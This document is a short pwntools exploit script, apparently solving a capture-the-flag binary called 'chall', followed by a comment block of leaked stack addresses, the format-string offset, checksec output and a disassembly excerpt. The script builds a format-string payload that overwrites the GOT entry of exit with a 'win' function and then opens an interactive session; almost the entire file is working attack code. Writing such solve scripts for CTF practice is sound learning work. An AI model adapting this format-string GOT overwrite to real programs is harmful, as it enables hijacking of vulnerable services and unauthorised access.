from pwn import *


def con(argv=[], *a, **kw):
	if args.REMOTE:
		return remote(sys.argv[1], sys.argv[2], *a, **kw)
	elif args.GDB:
		return gdb.debug(exe, gdbscript='''
			b *0x00000000004012b5
			c
			''')
	else:
		return process(exe)


exe = './chall'
io = con()
elf = context.binary = ELF(exe, checksec = False)

context.log_level = 'info'


payload = fmtstr_payload(10, {elf.got['exit']: elf.sym['win'] })


info(f'payload = {payload}')

info(f'len = {len(payload)}')

io.sendlineafter(b'use?\n',str(1))
io.sendlineafter(b'Index?\n',str(4))
io.sendlineafter(b'with?\n',str(0))
io.sendlineafter(b'service.\n',payload)
io.interactive()
'''
%p %p %p %p %p %p %p %p %p %p

0x7fffffffde14 (nil) 0x7ffff7d147e2 (nil) 0x7fffffffd8a0 0x7ffff7e17600 0x1f7c8a5ad 0xa000000001 0x7fffffffde58 

reflected input %10$p

RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)


004012b5 e8 66 fe        CALL       exit_function                                    undefined exit_function()
         ff ff

                             win (004012b5+5)                                XREF[0,3]:   Entry Point(*), 004021b4, 
                                                                                          00402294(*)  
004012b5 0f 88 65        JS         exit_function
         fe ff ff
004012bb 0f              ??         0Fh
004012bc 1e              ??         1Eh
004012bd fa              ??         FAh



'''
